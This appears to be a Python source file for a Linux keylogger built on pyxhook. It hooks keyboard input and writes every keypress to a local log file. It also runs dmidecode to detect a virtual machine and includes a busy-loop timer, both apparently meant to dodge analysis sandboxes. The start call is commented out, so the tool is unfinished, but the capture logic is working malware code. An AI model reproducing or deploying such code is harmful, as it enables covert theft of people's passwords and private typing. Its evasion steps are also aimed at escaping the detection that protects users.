import logging
import subprocess
# Allows for working on linux
import pyxhook as pyx
import random

# Create the file
logging.basicConfig(filename="keyfile.log", level=logging.INFO)

# Didn't create the file##################
# IDK it should have?
#log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/Keylogger/file.log'))
# Another Failed attempt##################
#def create(name, path):
#	file_name = path + '/' + name
#	open(file_name, 'a').close()

def OnKeyPress(event):
	# When a key is pressed log it
    with open('keyfile.log', 'a') as f:
        f.write('{}\n'.format(event.Key))

# Waste time instead of sleep
def calculator():
	ans = 0
	while ans <= 1000000:
		ans += random.randint(0, 45)
	keylogger_hook.cancel()

# Check if VM
#something = os.system("sudo dmidecode -t system|grep 'Manufacturer\|Product'")

result = subprocess.check_output(['dmidecode'])
print(result)

#if check == 1:
#	calculator()
#	exit(1)

# input hooks
# Required for getting keyboard input
keylogger_hook = pyx.HookManager()
keylogger_hook.KeyDown = OnKeyPress

# Stored letters a-z and special characters
# also containts shift keys, return (enter), and more
keylogger_hook.HookKeyboard()

try:
	#create('file.log', '~/Desktop/Keylogger')
	#keylogger_hook.start()
	pass
except KeyboardInterrupt:
	pass
